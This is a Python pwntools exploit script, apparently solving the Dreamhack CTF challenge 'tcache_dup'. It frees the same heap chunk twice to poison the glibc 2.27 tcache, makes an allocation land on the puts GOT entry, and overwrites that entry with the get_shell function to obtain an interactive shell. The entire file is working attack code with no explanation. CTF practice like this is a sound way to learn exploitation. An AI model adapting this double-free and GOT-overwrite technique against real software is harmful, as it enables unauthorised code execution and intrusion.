#!/usr/bin/env python3

from pwn import *

exe = ELF('tcache_dup_patched', checksec=False)
libc = ELF('libc-2.27.so', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*main+92

        ''')
        input()


if args.REMOTE:
    p = remote('host3.dreamhack.games', 12046)
else:
    p = process([exe.path])
GDB()

def create(size, data):
    slna(b'> ', 1)
    slna(b'Size: ', size)
    sla(b'Data: ', data)

def delete(idx):
    slna(b'> ', 2)
    slna(b'idx: ', idx)

create(200, b'A'*4)
delete(0)
delete(0)
create(200, p64(exe.got['puts']))
create(200, b'A'*4)
create(200, p64(exe.sym['get_shell']))

p.interactive()
